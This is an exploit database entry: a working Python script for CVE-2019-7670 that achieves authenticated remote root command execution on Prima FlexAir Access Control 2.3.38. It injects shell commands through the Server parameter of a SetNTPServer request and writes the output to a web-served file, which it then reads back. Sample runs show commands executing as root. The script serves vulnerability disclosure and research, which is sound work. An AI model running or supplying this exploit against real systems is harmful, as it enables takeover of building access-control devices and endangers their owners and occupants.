# Exploit Title: Prima FlexAir Access Control 2.3.38 - Remote Code Execution
# Google Dork: NA
# Date: 2018-09-06
# Exploit Author: LiquidWorm
# Vendor Homepage: https://www.primasystems.eu/
# Software Link: https://primasystems.eu/flexair-access-control/
# Version: 2.3.38
# Tested on: NA
# CVE : CVE-2019-7670

#!/usr/bin/env python
#
# Authenticated Remote Root Exploit for Prima FlexAir Access Control 2.3.38
# via Command Injection in SetNTPServer request, Server parameter.
#
# CVE: CVE-2019-7670
# Advisory: https://applied-risk.com/resources/ar-2019-007
# Paper: https://applied-risk.com/resources/i-own-your-building-management-system
#
# By Gjoko 'LiquidWorm' Krstic
#
# 18.01.2019
#
############################################################################
#
# $ python ntpcmdinj.py
# [+] Usage: python ntpcmdinj.py [Target] [Session-ID] [Command]
# [+] Example: python ntpcmdinj.py http://10.0.251.17:8080 10167847 whoami
#
# $ python ntpcmdinj.py http://192.168.230.17:8080 11339284 "uname -a"
# Linux Alpha 4.4.16 #1 Mon Aug 29 13:29:40 CEST 2016 armv7l GNU/Linux
#
# $ python ntpcmdinj.py http://192.168.230.17:8080 11339284 id
# uid=0(root) gid=0(root) groups=0(root),10(wheel)
#
############################################################################
#

import requests
import sys#####

if len(sys.argv) < 4:
    print '[+] Usage: python ntpcmdinj.py [Target] [Session-ID] [Command]'
    print '[+] Example: python ntpcmdinj.py http://10.0.0.17:8080 10167847 whoami\n'
    sys.exit()

host = sys.argv[1]
sessionid = sys.argv[2]
commando = sys.argv[3]

url = host+"/bin/sysfcgi.fx"

headers = {"Session-ID"       : sessionid, # Muy importante!
           "User-Agent"       : "Dj/Ole",
           "Content-Type"     : "application/x-www-form-urlencoded; charset=UTF-8",
           "Accept"           : "text/html, */*; q=0.01",
           "Session-Pc"       : "2",
           "X-Requested-With" : "XMLHttpRequest",
           "Accept-Encoding"  : "gzip, deflate",
           "Accept-Language"  : "en-US,en;q=0.9"}

payload = ("<requests><request name=\"SetNTPServer\">"
           "<param name=\"Server\" value=\"2.europe.p"
           "ool.ntp.org;"+commando+">/www/pages/ap"
           "p/images/logos/stage.txt|\"/></request></"
           "requests>")

requests.post(url, headers=headers, data=payload)

e = requests.get(host+"/app/images/logos/stage.txt")
print e.text